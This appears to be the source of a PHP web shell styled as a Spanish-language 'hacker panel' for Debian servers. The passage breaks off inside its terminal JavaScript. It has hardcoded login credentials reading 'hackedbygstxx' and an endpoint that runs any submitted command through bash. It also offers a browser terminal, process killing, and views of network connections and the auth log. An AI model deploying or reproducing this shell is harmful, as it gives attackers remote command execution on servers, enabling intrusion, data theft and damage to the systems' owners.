<?php
// ============================================
// PANEL DE ADMINISTRACIÓN HACKER PARA DEBIAN
// ============================================
// Versión 2.0 - Con AJAX, Terminal Modal, UI Mejorada
// ============================================

session_start();
error_reporting(0);

// Manejo de logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ============================================
// CONFIGURACIÓN
// ============================================
$config = [
    'title' => 'PANEL HACKER',
    'default_user' => 'gstxx',
    'default_pass' => 'hackedbygstxx',
    'refresh_rate' => 5,
    'max_terminal_lines' => 100
];

// ============================================
// FUNCIONES DEL SISTEMA
// ============================================

function executeSystemCommand($command)
{
    if (empty($command))
        return '';
    $output = @shell_exec($command . ' 2>/dev/null');
    return $output !== null ? trim($output) : '';
}

function executeUserCommand($command)
{
    if (empty($command))
        return '';
    $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
    $process = proc_open("timeout 30 bash -c " . escapeshellarg($command), $descriptorspec, $pipes);
    if (is_resource($process)) {
        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        $errors = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        return $output . ($errors ? "\n" . $errors : '');
    }
    return "Error ejecutando comando";
}

function getSystemInfo()
{
    $info = [];

    // CPU
    $load = sys_getloadavg();
    $cpu_count = intval(executeSystemCommand("nproc")) ?: 1;
    $cpu_usage = min(round($load[0] * 100 / $cpu_count, 1), 100);
    $cpu_model = executeSystemCommand("grep 'model name' /proc/cpuinfo | head -1 | cut -d: -f2");
    $cpu_freq = executeSystemCommand("grep 'cpu MHz' /proc/cpuinfo | head -1 | awk '{print $4}'");

    $info['cpu'] = [
        'usage' => $cpu_usage,
        'cores' => $cpu_count,
        'load' => $load,
        'model' => $cpu_model ?: 'Desconocido',
        'frequency' => ($cpu_freq ?: '0') . ' MHz'
    ];

    // RAM
    $meminfo = executeSystemCommand("free -m | grep Mem");
    $parts = preg_split('/\s+/', $meminfo);
    $mem_total = isset($parts[1]) ? intval($parts[1]) : 0;
    $mem_used = isset($parts[2]) ? intval($parts[2]) : 0;
    $mem_usage = $mem_total > 0 ? round(($mem_used / $mem_total) * 100, 1) : 0;

    $info['memory'] = [
        'total' => $mem_total . ' MB',
        'used' => $mem_used . ' MB',
        'free' => ($mem_total - $mem_used) . ' MB',
        'usage' => $mem_usage
    ];

    // GPU
    $nvidia = executeSystemCommand("nvidia-smi --query-gpu=utilization.gpu,memory.total,memory.used,temperature.gpu,name --format=csv,noheader,nounits");
    if ($nvidia) {
        $gpu = array_map('trim', explode(',', $nvidia));
        $info['gpu'] = [
            'usage' => intval($gpu[0] ?? 0),
            'memory_total' => round(($gpu[1] ?? 0) / 1024, 1) . ' GB',
            'memory_used' => round(($gpu[2] ?? 0) / 1024, 1) . ' GB',
            'temperature' => ($gpu[3] ?? 0) . '°C',
            'name' => $gpu[4] ?? 'GPU'
        ];
    } else {
        $info['gpu'] = ['usage' => 0, 'name' => 'No GPU', 'memory_total' => '0', 'memory_used' => '0', 'temperature' => '0°C'];
    }

    // Red - Todas las interfaces
    $interfaces_raw = executeSystemCommand("ip -o addr show | grep 'inet ' | awk '{print $2, $4}'");
    $interfaces = [];
    foreach (explode("\n", $interfaces_raw) as $line) {
        if (empty(trim($line)))
            continue;
        $parts = explode(' ', trim($line));
        if (count($parts) >= 2) {
            $iface = $parts[0];
            $ip = explode('/', $parts[1])[0];
            $priority = ($iface === 'lo') ? 99 : (strpos($iface, 'eth') === 0 ? 1 : (strpos($iface, 'wlan') === 0 ? 2 : 10));
            $interfaces[] = ['name' => $iface, 'ip' => $ip, 'priority' => $priority];
        }
    }
    usort($interfaces, fn($a, $b) => $a['priority'] - $b['priority']);
    $info['network'] = ['interfaces' => $interfaces];

    // Sistema
    $info['hostname'] = executeSystemCommand("hostname") ?: 'localhost';
    $info['uptime'] = executeSystemCommand("uptime -p") ?: 'N/A';
    $info['kernel'] = executeSystemCommand("uname -r") ?: 'N/A';
    $info['os'] = executeSystemCommand("grep PRETTY_NAME /etc/os-release | cut -d= -f2 | tr -d '\"'") ?: 'Linux';
    $info['disks'] = executeSystemCommand("df -h | grep '^/dev'") ?: 'N/A';

    return $info;
}

function getProcesses()
{
    $output = executeSystemCommand("ps aux --sort=-%cpu | head -15");
    $lines = explode("\n", $output);
    $processes = [];
    foreach ($lines as $i => $line) {
        if ($i === 0 || empty(trim($line)))
            continue;
        $parts = preg_split('/\s+/', trim($line), 11);
        if (count($parts) >= 11) {
            $processes[] = ['user' => $parts[0], 'pid' => $parts[1], 'cpu' => $parts[2], 'mem' => $parts[3], 'command' => $parts[10]];
        }
    }
    return $processes;
}

function getConnections()
{
    $output = executeSystemCommand("ss -tunap | tail -n +2 | head -20");
    $lines = explode("\n", $output);
    $connections = [];
    foreach ($lines as $line) {
        if (empty(trim($line)))
            continue;
        $parts = preg_split('/\s+/', trim($line));
        if (count($parts) >= 5) {
            $connections[] = ['proto' => $parts[0], 'local' => $parts[4] ?? '', 'foreign' => $parts[5] ?? '', 'state' => $parts[1] ?? ''];
        }
    }
    return $connections;
}

// ============================================
// API AJAX
// ============================================
if (isset($_GET['ajax'])) {
    header('Content-Type: application/json');

    if (!isset($_SESSION['authenticated'])) {
        echo json_encode(['error' => 'No autenticado']);
        exit;
    }

    $action = $_GET['ajax'];

    if ($action === 'system_info') {
        echo json_encode(getSystemInfo());
    } elseif ($action === 'processes') {
        echo json_encode(getProcesses());
    } elseif ($action === 'connections') {
        echo json_encode(getConnections());
    } elseif ($action === 'execute') {
        $cmd = $_POST['cmd'] ?? '';
        echo json_encode(['output' => executeUserCommand($cmd)]);
    }
    exit;
}

// ============================================
// TERMINAL SESSION
// ============================================
$current_dir = $_SESSION['current_dir'] ?? '/home';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SESSION['authenticated']) && isset($_POST['terminal_cmd'])) {
    $cmd = $_POST['terminal_cmd'];
    if (strpos($cmd, 'cd ') === 0) {
        $new_dir = trim(substr($cmd, 3));
        if ($new_dir === '~')
            $new_dir = '/root';
        if ($new_dir === '..')
            $new_dir = dirname($current_dir);
        if (is_dir($new_dir)) {
            $current_dir = realpath($new_dir);
            $_SESSION['current_dir'] = $current_dir;
        }
    }
}

// ============================================
// AUTENTICACIÓN
// ============================================
if (!isset($_SESSION['authenticated'])) {
    $login_error = null;
    if (isset($_POST['login'])) {
        $u = trim($_POST['username'] ?? '');
        $p = trim($_POST['password'] ?? '');
        if ($u === $config['default_user'] && $p === $config['default_pass']) {
            $_SESSION['authenticated'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = "Credenciales incorrectas";
        }
    }
    showLoginForm($config, $login_error);
    exit;
}

$system_info = getSystemInfo();
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $config['title']; ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --neon: #0f0;
            --neon-dim: #0a0;
            --bg: #000;
            --bg-panel: #050505;
            --bg-header: #0a0a0a;
            --border: #1a1a1a;
        }

        body {
            background: var(--bg);
            color: var(--neon);
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }

        /* Layout */
        .container {
            padding: 10px;
            min-height: 100vh;
        }

        .header {
            background: var(--bg-header);
            border: 1px solid var(--border);
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
        }

        .header h1 {
            font-size: 1.3rem;
            text-shadow: 0 0 5px var(--neon);
        }

        .header-info {
            display: flex;
            gap: 20px;
            align-items: center;
            font-size: 0.85rem;
            opacity: 0.8;
        }

        .btn {
            background: transparent;
            border: 1px solid var(--neon);
            color: var(--neon);
            padding: 8px 16px;
            cursor: pointer;
            font-family: inherit;
            font-size: 0.85rem;
            transition: all 0.2s;
        }

        .btn:hover {
            background: var(--neon);
            color: #000;
        }

        .btn-danger {
            border-color: #f00;
            color: #f00;
        }

        .btn-danger:hover {
            background: #f00;
        }

        /* Navigation */
        .nav {
            display: flex;
            gap: 5px;
            margin-bottom: 15px;
            flex-wrap: wrap;
            background: var(--bg-header);
            padding: 10px;
            border: 1px solid var(--border);
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--border);
            color: var(--neon-dim);
            padding: 8px 14px;
            cursor: pointer;
            font-family: inherit;
            font-size: 0.8rem;
            transition: all 0.2s;
        }

        .nav-btn:hover,
        .nav-btn.active {
            border-color: var(--neon);
            color: var(--neon);
            text-shadow: 0 0 5px var(--neon);
        }

        /* Dashboard Grid */
        .dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 15px;
        }

        /* Panels - Resizable */
        .panel {
            background: var(--bg-panel);
            border: 1px solid var(--border);
            min-height: 200px;
            resize: both;
            overflow: auto;
            transition: box-shadow 0.2s;
        }

        .panel:hover {
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.15);
        }

        .panel-header {
            background: var(--bg-header);
            padding: 12px 15px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1;
        }

        .panel-title {
            font-size: 0.95rem;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .panel-badge {
            background: var(--neon);
            color: #000;
            padding: 2px 8px;
            font-size: 0.8rem;
            font-weight: bold;
        }

        .panel-content {
            padding: 15px;
        }

        /* Gauge - Mejorado */
        .gauge-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 15px;
        }

        .gauge {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .gauge-bg {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 8px solid var(--border);
        }

        .gauge-fill {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 8px solid transparent;
            border-top-color: var(--neon);
            transform: rotate(-90deg);
            transition: all 0.5s;
        }

        .gauge-center {
            width: 80px;
            height: 80px;
            background: #000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 1;
            border: 2px solid var(--border);
        }

        .gauge-value {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--neon);
            text-shadow: 0 0 10px var(--neon);
        }

        .gauge-label {
            font-size: 0.7rem;
            opacity: 0.7;
            margin-top: 2px;
        }

        /* Info List */
        .info-list {
            font-size: 0.85rem;
        }

        .info-list p {
            margin: 6px 0;
            display: flex;
            justify-content: space-between;
        }

        .info-list strong {
            opacity: 0.7;
        }

        /* Network Interfaces */
        .interface-item {
            padding: 8px 12px;
            margin: 5px 0;
            background: var(--bg-header);
            border-left: 3px solid var(--neon);
            display: flex;
            justify-content: space-between;
            font-size: 0.85rem;
        }

        .interface-item.priority-1 {
            border-color: #0f0;
        }

        .interface-item.priority-2 {
            border-color: #0af;
        }

        .interface-item.priority-99 {
            border-color: #555;
            opacity: 0.6;
        }

        /* Quick Commands */
        .quick-cmds {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 8px;
        }

        .quick-cmds .btn {
            font-size: 0.75rem;
            padding: 10px;
        }

        /* Modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal {
            background: var(--bg-panel);
            border: 2px solid var(--neon);
            width: 90%;
            max-width: 900px;
            max-height: 80vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }

        .modal-header {
            background: var(--bg-header);
            padding: 12px 20px;
            border-bottom: 1px solid var(--neon);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-body {
            flex: 1;
            overflow-y: auto;
            padding: 0;
            min-height: 400px;
        }

        /* Terminal */
        .terminal-output {
            background: #000;
            color: var(--neon);
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            white-space: pre-wrap;
            word-break: break-all;
            min-height: 350px;
            max-height: 400px;
            overflow-y: auto;
        }

        .terminal-input-row {
            display: flex;
            background: var(--bg-header);
            border-top: 1px solid var(--border);
            padding: 10px;
        }

        .terminal-prompt {
            color: var(--neon);
            margin-right: 10px;
            white-space: nowrap;
        }

        .terminal-input {
            flex: 1;
            background: transparent;
            border: none;
            color: var(--neon);
            font-family: inherit;
            font-size: 0.9rem;
            outline: none;
        }

        /* Command Output Modal */
        .cmd-output {
            background: #000;
            color: #0f0;
            padding: 20px;
            font-family: monospace;
            white-space: pre-wrap;
            min-height: 300px;
            overflow-y: auto;
        }

        /* Tables */
        .data-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.8rem;
        }

        .data-table th {
            background: var(--bg-header);
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid var(--neon);
        }

        .data-table td {
            padding: 8px 10px;
            border-bottom: 1px solid var(--border);
        }

        .data-table tr:hover {
            background: rgba(0, 255, 0, 0.05);
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--neon-dim);
            border-radius: 4px;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                gap: 10px;
                text-align: center;
            }

            .header-info {
                justify-content: center;
                flex-wrap: wrap;
            }

            .dashboard {
                grid-template-columns: 1fr;
            }

            .nav {
                justify-content: center;
            }
        }

        /* Content sections */
        .content-section {
            display: none;
        }

        .content-section.active {
            display: block;
        }

        .full-panel {
            background: var(--bg-panel);
            border: 1px solid var(--border);
            padding: 20px;
        }

        pre {
            color: var(--neon);
            font-family: monospace;
            white-space: pre-wrap;
            word-break: break-all;
        }
    </style>
</head>

<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>⚡ <?php echo $config['title']; ?></h1>
            <div class="header-info">
                <span id="hostname"><?php echo htmlspecialchars($system_info['hostname']); ?></span>
                <span id="uptime"><?php echo htmlspecialchars($system_info['uptime']); ?></span>
                <span id="clock"></span>
                <a href="?logout=1" class="btn btn-danger">SALIR</a>
            </div>
        </div>

        <!-- Navigation -->
        <div class="nav">
            <button class="nav-btn active" onclick="showSection('dashboard')">DASHBOARD</button>
            <button class="nav-btn" onclick="showSection('processes')">PROCESOS</button>
            <button class="nav-btn" onclick="showSection('network')">RED</button>
            <button class="nav-btn" onclick="showSection('disks')">DISCOS</button>
            <button class="nav-btn" onclick="showSection('logs')">LOGS</button>
            <button class="nav-btn" onclick="openTerminal()">💻 TERMINAL</button>
        </div>

        <!-- Dashboard -->
        <div id="section-dashboard" class="content-section active">
            <div class="dashboard">
                <!-- CPU -->
                <div class="panel" id="panel-cpu">
                    <div class="panel-header">
                        <span class="panel-title">⚡ CPU</span>
                        <span class="panel-badge" id="cpu-badge"><?php echo $system_info['cpu']['usage']; ?>%</span>
                    </div>
                    <div class="panel-content">
                        <div class="gauge-container">
                            <div class="gauge">
                                <div class="gauge-bg"></div>
                                <svg class="gauge-svg" viewBox="0 0 120 120"
                                    style="position:absolute;width:100%;height:100%;transform:rotate(-90deg)">
                                    <circle cx="60" cy="60" r="52" fill="none" stroke="var(--border)"
                                        stroke-width="8" />
                                    <circle id="cpu-circle" cx="60" cy="60" r="52" fill="none" stroke="var(--neon)"
                                        stroke-width="8" stroke-dasharray="326.7" stroke-dashoffset="326.7"
                                        stroke-linecap="round" />
                                </svg>
                                <div class="gauge-center">
                                    <span class="gauge-value"
                                        id="cpu-value"><?php echo $system_info['cpu']['usage']; ?>%</span>
                                    <span class="gauge-label">USO</span>
                                </div>
                            </div>
                        </div>
                        <div class="info-list">
                            <p><strong>Modelo:</strong> <span
                                    id="cpu-model"><?php echo htmlspecialchars(substr($system_info['cpu']['model'], 0, 30)); ?></span>
                            </p>
                            <p><strong>Núcleos:</strong> <span
                                    id="cpu-cores"><?php echo $system_info['cpu']['cores']; ?></span></p>
                            <p><strong>Carga:</strong> <span
                                    id="cpu-load"><?php echo implode(' | ', array_map(fn($l) => number_format($l, 2), $system_info['cpu']['load'])); ?></span>
                            </p>
                        </div>
                    </div>
                </div>

                <!-- RAM -->
                <div class="panel" id="panel-ram">
                    <div class="panel-header">
                        <span class="panel-title">💾 RAM</span>
                        <span class="panel-badge" id="ram-badge"><?php echo $system_info['memory']['usage']; ?>%</span>
                    </div>
                    <div class="panel-content">
                        <div class="gauge-container">
                            <div class="gauge">
                                <div class="gauge-bg"></div>
                                <svg class="gauge-svg" viewBox="0 0 120 120"
                                    style="position:absolute;width:100%;height:100%;transform:rotate(-90deg)">
                                    <circle cx="60" cy="60" r="52" fill="none" stroke="var(--border)"
                                        stroke-width="8" />
                                    <circle id="ram-circle" cx="60" cy="60" r="52" fill="none" stroke="var(--neon)"
                                        stroke-width="8" stroke-dasharray="326.7" stroke-dashoffset="326.7"
                                        stroke-linecap="round" />
                                </svg>
                                <div class="gauge-center">
                                    <span class="gauge-value"
                                        id="ram-value"><?php echo $system_info['memory']['usage']; ?>%</span>
                                    <span class="gauge-label">USO</span>
                                </div>
                            </div>
                        </div>
                        <div class="info-list">
                            <p><strong>Total:</strong> <span
                                    id="ram-total"><?php echo $system_info['memory']['total']; ?></span></p>
                            <p><strong>Usado:</strong> <span
                                    id="ram-used"><?php echo $system_info['memory']['used']; ?></span></p>
                            <p><strong>Libre:</strong> <span
                                    id="ram-free"><?php echo $system_info['memory']['free']; ?></span></p>
                        </div>
                    </div>
                </div>

                <!-- GPU -->
                <div class="panel" id="panel-gpu">
                    <div class="panel-header">
                        <span class="panel-title">🎮 GPU</span>
                        <span class="panel-badge" id="gpu-badge"><?php echo $system_info['gpu']['usage']; ?>%</span>
                    </div>
                    <div class="panel-content">
                        <div class="gauge-container">
                            <div class="gauge">
                                <div class="gauge-bg"></div>
                                <svg class="gauge-svg" viewBox="0 0 120 120"
                                    style="position:absolute;width:100%;height:100%;transform:rotate(-90deg)">
                                    <circle cx="60" cy="60" r="52" fill="none" stroke="var(--border)"
                                        stroke-width="8" />
                                    <circle id="gpu-circle" cx="60" cy="60" r="52" fill="none" stroke="var(--neon)"
                                        stroke-width="8" stroke-dasharray="326.7" stroke-dashoffset="326.7"
                                        stroke-linecap="round" />
                                </svg>
                                <div class="gauge-center">
                                    <span class="gauge-value"
                                        id="gpu-value"><?php echo $system_info['gpu']['usage']; ?>%</span>
                                    <span class="gauge-label">USO</span>
                                </div>
                            </div>
                        </div>
                        <div class="info-list">
                            <p><strong>Modelo:</strong> <span
                                    id="gpu-name"><?php echo htmlspecialchars($system_info['gpu']['name']); ?></span>
                            </p>
                            <p><strong>VRAM:</strong> <span
                                    id="gpu-mem"><?php echo $system_info['gpu']['memory_used']; ?> /
                                    <?php echo $system_info['gpu']['memory_total']; ?></span></p>
                            <p><strong>Temp:</strong> <span
                                    id="gpu-temp"><?php echo $system_info['gpu']['temperature']; ?></span></p>
                        </div>
                    </div>
                </div>

                <!-- Network Interfaces -->
                <div class="panel" id="panel-network">
                    <div class="panel-header">
                        <span class="panel-title">🌐 INTERFACES DE RED</span>
                        <span class="panel-badge"><?php echo count($system_info['network']['interfaces']); ?></span>
                    </div>
                    <div class="panel-content" id="network-interfaces">
                        <?php foreach ($system_info['network']['interfaces'] as $iface): ?>
                            <div class="interface-item priority-<?php echo $iface['priority']; ?>">
                                <span><?php echo htmlspecialchars($iface['name']); ?></span>
                                <span><?php echo htmlspecialchars($iface['ip']); ?></span>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>

                <!-- System Info -->
                <div class="panel">
                    <div class="panel-header">
                        <span class="panel-title">🖥️ SISTEMA</span>
                    </div>
                    <div class="panel-content">
                        <div class="info-list">
                            <p><strong>OS:</strong> <span><?php echo htmlspecialchars($system_info['os']); ?></span></p>
                            <p><strong>Kernel:</strong>
                                <span><?php echo htmlspecialchars($system_info['kernel']); ?></span></p>
                            <p><strong>Hostname:</strong>
                                <span><?php echo htmlspecialchars($system_info['hostname']); ?></span></p>
                            <p><strong>Uptime:</strong> <span
                                    id="sys-uptime"><?php echo htmlspecialchars($system_info['uptime']); ?></span></p>
                        </div>
                    </div>
                </div>

                <!-- Quick Commands -->
                <div class="panel">
                    <div class="panel-header">
                        <span class="panel-title">🚀 COMANDOS RÁPIDOS</span>
                    </div>
                    <div class="panel-content">
                        <div class="quick-cmds">
                            <button class="btn" onclick="runQuickCmd('top -bn1 | head -20')">TOP</button>
                            <button class="btn" onclick="runQuickCmd('nvidia-smi')">GPU INFO</button>
                            <button class="btn" onclick="runQuickCmd('ss -tunap')">CONEXIONES</button>
                            <button class="btn" onclick="runQuickCmd('iostat 2>/dev/null || cat /proc/diskstats')">DISK
                                I/O</button>
                            <button class="btn"
                                onclick="runQuickCmd('systemctl list-units --type=service --state=running | head -20')">SERVICIOS</button>
                            <button class="btn" onclick="runQuickCmd('dmesg | tail -30')">DMESG</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Processes Section -->
        <div id="section-processes" class="content-section">
            <div class="full-panel">
                <h3 style="margin-bottom: 15px;">📊 Procesos (Top por CPU)</h3>
                <div style="overflow-x: auto;">
                    <table class="data-table" id="processes-table">
                        <thead>
                            <tr>
                                <th>PID</th>
                                <th>Usuario</th>
                                <th>CPU%</th>
                                <th>MEM%</th>
                                <th>Comando</th>
                                <th>Acción</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Network Section -->
        <div id="section-network" class="content-section">
            <div class="full-panel">
                <h3 style="margin-bottom: 15px;">🔗 Conexiones Activas</h3>
                <div style="overflow-x: auto;">
                    <table class="data-table" id="connections-table">
                        <thead>
                            <tr>
                                <th>Proto</th>
                                <th>Local</th>
                                <th>Remoto</th>
                                <th>Estado</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Disks Section -->
        <div id="section-disks" class="content-section">
            <div class="full-panel">
                <h3 style="margin-bottom: 15px;">💿 Uso de Discos</h3>
                <pre id="disks-output"><?php echo htmlspecialchars($system_info['disks']); ?></pre>
            </div>
        </div>

        <!-- Logs Section -->
        <div id="section-logs" class="content-section">
            <div class="full-panel">
                <h3 style="margin-bottom: 15px;">📝 Logs del Sistema</h3>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                    <div>
                        <h4 style="margin-bottom: 10px; opacity: 0.7;">Kernel (dmesg)</h4>
                        <pre id="log-dmesg"
                            style="max-height: 300px; overflow-y: auto; background: #000; padding: 10px;">Cargando...</pre>
                    </div>
                    <div>
                        <h4 style="margin-bottom: 10px; opacity: 0.7;">Auth Log</h4>
                        <pre id="log-auth"
                            style="max-height: 300px; overflow-y: auto; background: #000; padding: 10px;">Cargando...</pre>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Terminal Modal -->
    <div class="modal-overlay" id="terminal-modal">
        <div class="modal" style="max-width: 1000px;">
            <div class="modal-header">
                <span>💻 TERMINAL - <?php echo htmlspecialchars($system_info['hostname']); ?></span>
                <button class="btn btn-danger" onclick="closeTerminal()">✕ CERRAR</button>
            </div>
            <div class="modal-body">
                <div class="terminal-output" id="terminal-output"></div>
                <div class="terminal-input-row">
                    <span class="terminal-prompt"
                        id="terminal-prompt">cecyte@<?php echo htmlspecialchars($system_info['hostname']); ?>:~$</span>
                    <input type="text" class="terminal-input" id="terminal-input" placeholder="Escribe un comando..."
                        autocomplete="off">
                </div>
            </div>
        </div>
    </div>

    <!-- Command Output Modal -->
    <div class="modal-overlay" id="cmd-modal">
        <div class="modal">
            <div class="modal-header">
                <span id="cmd-title">Output</span>
                <button class="btn btn-danger" onclick="closeCmdModal()">✕ CERRAR</button>
            </div>
            <div class="modal-body">
                <div class="cmd-output" id="cmd-output">Ejecutando...</div>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // JavaScript - Panel Hacker v2
        // ============================================

        const REFRESH_RATE = <?php echo $config['refresh_rate']; ?> * 1000;
        let currentSection = 'dashboard';
        let terminalHistory = [];
        let historyIndex = -1;
        let currentDir = '<?php echo addslashes($current_dir); ?>';

        // Clock
        function updateClock() {
            document.getElementById('clock').textContent = new Date().toLocaleTimeString();
        }
        setInterval(updateClock, 1000);
        updateClock();

        // Sections
        function showSection(section) {
            document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('section-' + section).classList.add('active');
            event.target.classList.add('active');
            currentSection = section;

            if (section === 'processes') loadProcesses();
            if (section === 'network') loadConnections();
            if (section === 'logs') loadLogs();
        }

        // AJAX Update for gauges
        function updateGauge(id, value) {
            const circle = document.getElementById(id + '-circle');
            const valueEl = document.getElementById(id + '-value');
            const badge = document.getElementById(id + '-badge');
            const circumference = 326.7;
            const offset = circumference - (value / 100) * circumference;

            if (circle) circle.style.strokeDashoffset = offset;
            if (valueEl) valueEl.textContent = value + '%';
            if (badge) badge.textContent = value + '%';
        }

        // Fetch system info
        async function fetchSystemInfo() {
            try {
                const res = await fetch('?ajax=system_info');
                const data = await res.json();

                updateGauge('cpu', data.cpu.usage);
                updateGauge('ram', data.memory.usage);
                updateGauge('gpu', data.gpu.usage);

                document.getElementById('cpu-load').textContent = data.cpu.load.map(l => l.toFixed(2)).join(' | ');
                document.getElementById('ram-used').textContent = data.memory.used;
                document.getElementById('ram-free').textContent = data.memory.free;
                document.getElementById('gpu-temp').textContent = data.gpu.temperature;

            } catch (e) {
                console.error('Error fetching system info:', e);
            }
        }

        // Auto-update (only widgets, not page)
        setInterval(() => {
            if (currentSection === 'dashboard' && !document.getElementById('terminal-modal').classList.contains('active')) {
                fetchSystemInfo();
            }
        }, REFRESH_RATE);

        // Initial gauge setup
        updateGauge('cpu', <?php echo $system_info['cpu']['usage']; ?>);
        updateGauge('ram', <?php echo $system_info['memory']['usage']; ?>);
        updateGauge('gpu', <?php echo $system_info['gpu']['usage']; ?>);

        // Load Processes
        async function loadProcesses() {
            try {
                const res = await fetch('?ajax=processes');
                const data = await res.json();
                const tbody = document.querySelector('#processes-table tbody');
                tbody.innerHTML = data.map(p => `
                    <tr>
                        <td>${p.pid}</td>
                        <td>${p.user}</td>
                        <td style="color:#f55">${p.cpu}%</td>
                        <td style="color:#ff0">${p.mem}%</td>
                        <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis">${escapeHtml(p.command)}</td>
                        <td><button class="btn" onclick="runQuickCmd('kill -9 ${p.pid}')">KILL</button></td>
                    </tr>
                `).join('');
            } catch (e) {
                console.error('Error loading processes:', e);
            }
        }

        // Load Connections
        async function loadConnections() {
            try {
                const res = await fetch('?ajax=connections');
                const data = await res.json();
                const tbody = document.querySelector('#connections-table tbody');
                tbody.innerHTML = data.map(c => `
                    <tr>
                        <td>${c.proto}</td>
                        <td>${c.local}</td>
                        <td>${c.foreign}</td>
                        <td style="color:${c.state === 'ESTAB' ? '#0f0' : '#ff0'}">${c.state}</td>
                    </tr>
                `).join('');
            } catch (e) {
                console.error('Error loading connections:', e);
            }
        }

        // Load Logs
        async function loadLogs() {
            try {
                const dmesg = await fetch('?ajax=execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'cmd=dmesg | tail -30'
                }).then(r => r.json());
                document.getElementById('log-dmesg').textContent = dmesg.output || 'Sin datos';

                const auth = await fetch('?ajax=execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'cmd=tail -30 /var/log/auth.log 2>/dev/null || echo "No disponible"'
                }).then(r => r.json());
                document.getElementById('log-auth').textContent = auth.output || 'Sin datos';
            } catch (e) {
                console.error('Error loading logs:', e);
            }
        }

        // Quick Command Modal
        async function runQuickCmd(cmd) {
            document.getElementById('cmd-modal').classList.add('active');
            document.getElementById('cmd-title').textContent = '$ ' + cmd;
            document.getElementById('cmd-output').textContent = 'Ejecutando...';

            try {
                const res = await fetch('?ajax=execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'cmd=' + encodeURIComponent(cmd)
                });
                const data = await res.json();
                document.getElementById('cmd-output').textContent = data.output || 'Sin salida';
            } catch (e) {
                document.getElementById('cmd-output').textContent = 'Error: ' + e.message;
            }
        }

        function closeCmdModal() {
            document.getElementById('cmd-modal').classList.remove('active');
        }

        // Terminal
        function openTerminal() {
            document.getElementById('terminal-modal').classList.add('active');
            document.getElementById('terminal-input').focus();
            if (!document.getElementById('terminal-output').textContent) {
                appendTerminal('Sistema: Terminal interactiva iniciada. Escribe "help" para comandos.\n', '#0af');
            }
        }

        function closeTerminal() {
            document.getElementById('terminal-modal').classList.remove('active');
        }

        function appendTerminal(text, color = '#0f0') {
            const output = document.getElementById('terminal-output');
            const span = document.createElement('span');
            span.style.color = color;
            span.textContent = text;
            output.appendChild(span);
            output.scrollTop = output.scrollHeight;
        }

        async function executeTerminalCmd(cmd) {
            if (!cmd.trim()) return;

            terminalHistory.push(cmd);
            historyIndex = terminalHistory.length;

            const prompt = document.getElementById('terminal-prompt').textContent;
            appendTerminal(prompt + ' ' + cmd + '\n', '#0af');

            if (cmd === 'clear') {
                document.getElementById('terminal-output').innerHTML = '';
                return;
            }

            if (cmd === 'help') {
